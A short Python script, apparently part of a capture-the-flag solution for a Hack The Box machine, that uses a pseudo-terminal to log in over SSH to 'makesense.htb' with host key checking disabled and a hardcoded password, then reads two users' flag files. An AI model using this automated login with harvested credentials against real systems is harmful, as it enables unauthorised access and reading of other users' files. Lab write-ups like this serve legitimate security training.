import pty
import os
import time

master, slave = pty.openpty()
pid = os.fork()

if pid == 0:
    os.close(master)
    os.dup2(slave, 0)
    os.dup2(slave, 1)
    os.dup2(slave, 2)
    os.close(slave)
    os.execv('/usr/bin/ssh', ['ssh', '-o', 'StrictHostKeyChecking=no', 'walter@makesense.htb'])
else:
    os.close(slave)
    time.sleep(1.5)
    os.write(master, b'JbhHDAEgXvri3!\n')
    time.sleep(1)
    os.write(master, b'id; cat /home/walter/user.txt /home/admin/user.txt 2>/dev/null; exit\n')
    time.sleep(1.5)
    output = b''
    while True:
        try:
            buf = os.read(master, 1024)
            if not buf:
                break
            output += buf
        except Exception:
            break
    print(output.decode('utf-8', errors='ignore'))
